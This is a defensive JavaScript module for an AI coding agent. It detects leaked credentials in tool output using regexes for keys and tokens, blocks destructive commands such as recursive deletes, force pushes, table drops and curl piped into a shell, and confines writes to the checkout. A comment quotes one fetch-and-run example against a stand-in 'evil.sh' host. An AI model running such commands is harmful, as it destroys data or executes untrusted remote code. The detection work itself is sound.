/**
 * What must not leave a tool call, and what must not be run — R110.
 *
 * R51's rules answer *may this session run this command*, and `tool-rules.mjs`
 * answers it well — including the trap that makes it hard, where `Bash(mvn *)`
 * reads as "may run Maven" and `mvn test && curl evil.sh | sh` is what it
 * actually permits.
 *
 * Two things it does not see, and they are this file.
 *
 * **It does not read what comes back.** A session that greps a config, or cats
 * a `.env`, or hits a stack trace with a token in it, puts that in a transcript
 * the platform stores and the console renders to everybody with READER.
 *
 * **And it does not know where the work is.** A run is given a checkout and a
 * branch; nothing stops a session writing outside them.
 *
 * Pure, and here rather than in the API, for two different reasons that happen
 * to agree. Pure because a matcher for credentials is exactly the thing to run
 * at two hundred inputs in a test rather than guess at from a live session —
 * `code-map.mjs`'s argument. Here because the API cannot see a tool call, and a
 * check that runs where the thing is not happening is a check that does not run.
 *
 * A hit is **not a failure**. It is R51's shape: the call stops, a person is
 * asked, and the run says which side refused. A shield that killed the run is a
 * shield people turn off.
 */

/**
 * Credential shapes, most specific first.
 *
 * Anchored on the STRUCTURE of a credential rather than on the word next to it.
 * A rule that looked for `password =` would miss every token that arrives
 * without a label — which is most of them, because they arrive in URLs, headers
 * and stack traces.
 *
 * `name` is what a person is shown. It never includes the match.
 */
const SECRETS = [
  {
    name: 'a private key',
    // The header is the whole signal and it is unambiguous. Nothing else in a
    // repository is shaped like this.
    pattern: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----/,
  },
  {
    name: 'an AWS access key id',
    pattern: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/,
  },
  {
    name: 'a GitHub token',
    pattern: /\bgh[pousr]_[A-Za-z0-9]{36,}\b/,
  },
  {
    name: 'a Slack token',
    pattern: /\bxox[abposr]-[A-Za-z0-9-]{10,}\b/,
  },
  {
    name: 'an Anthropic API key',
    pattern: /\bsk-ant-[A-Za-z0-9_-]{20,}\b/,
  },
  {
    name: 'an OpenAI API key',
    pattern: /\bsk-(?:proj-)?[A-Za-z0-9]{32,}\b/,
  },
  {
    name: 'a Google API key',
    pattern: /\bAIza[0-9A-Za-z_-]{35}\b/,
  },
  {
    name: 'a JSON web token',
    // Three base64url segments. The `eyJ` prefix is a `{"` header, which is what
    // makes this distinguishable from any other dotted string.
    pattern: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/,
  },
  {
    name: 'a password in a connection URL',
    // The one place a password is reliably positional rather than labelled.
    pattern: /\b[a-z][a-z0-9+.-]*:\/\/[^\s:/@]+:[^\s/@]{3,}@/i,
  },
  {
    name: 'a bearer token',
    pattern: /\bauthorization\s*:\s*bearer\s+[A-Za-z0-9._~+/-]{16,}/i,
  },
  {
    name: "cawdev's own run token",
    // Ours, and the one this codebase is most likely to leak into its own
    // transcript: `cawdr_` is minted per run and appears in an environment.
    pattern: /\bcawdr_[A-Za-z0-9_-]{16,}\b/,
  },
];

/**
 * Commands that are usually fine and occasionally catastrophic — R110.
 *
 * "Usually fine" is the point. Nobody needs protecting from a command that is
 * always wrong; they need protecting from the one they run twenty times a week
 * and once, at three in the morning, in the wrong directory.
 *
 * Deliberately SHORT. A long list is one that gets turned off wholesale, and
 * every entry here has to earn a person's time when it stops them.
 */
const DESTRUCTIVE = [
  {
    // Both flags, in one cluster. The alternation is GROUPED, and the first
    // version of this was not: `...[rR]...[fF]|[fF]...[rR]` reads as "an rm with
    // -rf, OR an f followed by an r anywhere at all", which matched the `fr` in
    // `select * from users` and would have stopped every query in the codebase.
    name: 'a recursive delete',
    pattern: /\brm\s+(?:-[a-zA-Z]+\s+)*-[a-zA-Z]*(?:[rR][a-zA-Z]*[fF]|[fF][a-zA-Z]*[rR])/,
  },
  {
    // And the same thing written as two flags: `rm -r -f build`.
    name: 'a recursive delete',
    pattern: /\brm\s+(?:-[a-zA-Z]+\s+)*-[a-zA-Z]*[rR][a-zA-Z]*\s+(?:-[a-zA-Z]+\s+)*-[a-zA-Z]*[fF]/,
  },
  { name: 'a force push', pattern: /\bgit\s+push\b[^\n]*(?:--force(?!-with-lease)|(?<![\w-])-f\b)/ },
  { name: 'a hard reset', pattern: /\bgit\s+reset\s+[^\n]*--hard\b/ },
  { name: 'a branch deletion', pattern: /\bgit\s+(?:branch|push)\b[^\n]*(?:-D\b|--delete\b)/ },
  { name: 'a history rewrite', pattern: /\bgit\s+(?:filter-branch|filter-repo)\b/ },
  { name: 'dropping a table or database', pattern: /\bdrop\s+(?:table|database|schema)\b/i },
  { name: 'a delete with no where clause', pattern: /\bdelete\s+from\s+\w+\s*(?:;|$)/i },
  { name: 'a truncate', pattern: /\btruncate\s+(?:table\s+)?\w+/i },
  { name: 'a disk write', pattern: /\b(?:mkfs|dd)\b[^\n]*\bof=\/dev\// },
  { name: 'a permission reset on a whole tree', pattern: /\bchmod\s+-R\s+777\b/ },
  { name: 'piping the network into a shell', pattern: /\b(?:curl|wget)\b[^\n|]*\|\s*(?:ba|z|k)?sh\b/ },
];

/** How much of an offending line is shown. See `redact`. */
const CONTEXT = 40;

/**
 * What a piece of text reveals, if anything.
 *
 * Returns the FIRST match only. A result listing every secret in a file would
 * be a result that is itself a catalogue of that file's secrets, which is the
 * failure this exists to prevent, written to a different place.
 *
 * @param text anything a tool produced or is about to run
 * @returns {{name: string, redacted: string}|null}
 */
export function findSecret(text) {
  if (typeof text !== 'string' || !text) {
    return null;
  }
  for (const { name, pattern } of SECRETS) {
    const found = pattern.exec(text);
    if (found) {
      return { name, redacted: redact(text, found.index, found[0].length) };
    }
  }
  return null;
}

/**
 * Whether a command is one of the ones worth stopping.
 *
 * Reads the WHOLE command string, not its first word. `tool-rules.mjs` already
 * treats a compound command as un-matchable for the opposite reason — it will
 * not let a rule about `mvn` grant `mvn && curl | sh` — and the same shape here
 * means a destructive tail cannot hide behind a harmless head.
 *
 * @returns {{name: string, redacted: string}|null}
 */
export function findDestructive(command) {
  if (typeof command !== 'string' || !command) {
    return null;
  }
  for (const { name, pattern } of DESTRUCTIVE) {
    const found = pattern.exec(command);
    if (found) {
      return { name, redacted: redact(command, found.index, found[0].length) };
    }
  }
  return null;
}

/**
 * Whether a path is inside the work.
 *
 * The comparison is on RESOLVED paths and on segment boundaries. `/work/repo`
 * must not be read as containing `/work/repo-secrets`, which a `startsWith`
 * alone would — the same mistake `mcp__codegraph` covering
 * `mcp__codegraph-evil__x` would be, and `tool-rules.mjs` refuses it for the
 * same reason.
 *
 * `..` is resolved BEFORE the comparison rather than searched for: a path is
 * outside the checkout because of where it lands, not because of how it is
 * spelled, and a rule that rejected the characters would reject
 * `src/../src/main` while letting a symlink through.
 *
 * @param path an absolute or checkout-relative path the session wants to write
 * @param root the checkout, absolute
 * @param scope optional globs within the root; null means the whole checkout
 */
export function withinScope(path, root, scope = null) {
  if (typeof path !== 'string' || typeof root !== 'string' || !root) {
    return false;
  }
  const resolved = normalise(path.startsWith('/') ? path : `${root}/${path}`);
  const base = normalise(root);
  if (resolved !== base && !resolved.startsWith(`${base}/`)) {
    return false;
  }
  if (!Array.isArray(scope) || scope.length === 0) {
    return true;
  }
  const relative = resolved === base ? '' : resolved.slice(base.length + 1);
  return scope.some((glob) => matches(relative, glob));
}

/**
 * A path with `.` and `..` resolved, without touching the filesystem.
 *
 * Its own rather than `node:path`'s `resolve`, because that one resolves
 * against the PROCESS's working directory when handed a relative path — and the
 * daemon's cwd is not the checkout. A silent dependence on where the daemon
 * happens to be standing is exactly the bug this function exists to not have.
 */
function normalise(path) {
  const absolute = path.startsWith('/');
  const out = [];
  for (const part of path.split('/')) {
    if (!part || part === '.') {
      continue;
    }
    if (part === '..') {
      if (out.length && out[out.length - 1] !== '..') {
        out.pop();
      } else if (!absolute) {
        out.push('..');
      }
      continue;
    }
    out.push(part);
  }
  return (absolute ? '/' : '') + out.join('/');
}

/**
 * A glob, supporting `*`, `**` and `?` and nothing else.
 *
 * Deliberately small. A full glob implementation would be a dependency, and the
 * zero-dep constraint is what makes `tools/` a directory somebody can read
 * before running it against their repositories.
 */
function matches(path, glob) {
  if (typeof glob !== 'string' || !glob) {
    return false;
  }
  // `docs/**` names the directory as well as what is under it. Without this a
  // scope of `docs/**` would refuse a write to `docs` itself, which is a rule
  // that reads as "may write the docs" and behaves as "may not".
  const directory = glob.replace(/\/\*\*$/, '');
  if (directory !== glob && (path === directory || under(path, directory))) {
    return true;
  }
  return under(path, glob);
}

/** Whether a path is the glob, or is inside it. */
function under(path, glob) {
  const source = glob
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
    // `**` crosses separators; a single `*` does not. Ordered so the two-star
    // form is consumed before the one-star rule can see half of it.
    .replace(/\*\*/g, '\u0000')
    .replace(/\*/g, '[^/]*')
    .replace(/\u0000/g, '.*')
    .replace(/\?/g, '[^/]');
  return new RegExp(`^${source}$`).test(path) || new RegExp(`^${source}/`).test(path);
}

/**
 * Enough of the line to recognise, with the match itself removed.
 *
 * The redaction is the point and it is easy to get backwards: a block record
 * that carried the secret it blocked would be the failure this file exists to
 * prevent, written to the database this time. So the match is replaced, never
 * truncated — a truncated key is still most of a key.
 */
export function redact(text, index, length) {
  const from = Math.max(0, index - CONTEXT);
  const to = Math.min(text.length, index + length + CONTEXT);
  const before = text.slice(from, index);
  const after = text.slice(index + length, to);
  return `${from > 0 ? '…' : ''}${before}[redacted]${after}${to < text.length ? '…' : ''}`
    .replace(/\s+/g, ' ')
    .trim();
}
